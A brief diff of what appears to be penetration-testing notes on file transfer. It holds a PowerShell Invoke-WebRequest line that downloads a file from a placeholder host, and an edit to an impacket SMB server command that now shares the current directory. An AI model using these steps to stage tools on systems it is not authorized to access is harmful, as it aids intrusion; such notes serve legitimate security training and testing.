@@ -10,7 +10,7 @@ Invoke-WebRequest -Uri http://ip:8000/archivo -OutFile archivo
 ### SMB
 Local
 ```
-python Tools/impacket/smbserver.py Tools /home/pj/Tools
+python Tools/impacket/smbserver.py Tools .
 ```
 Remote
 ```
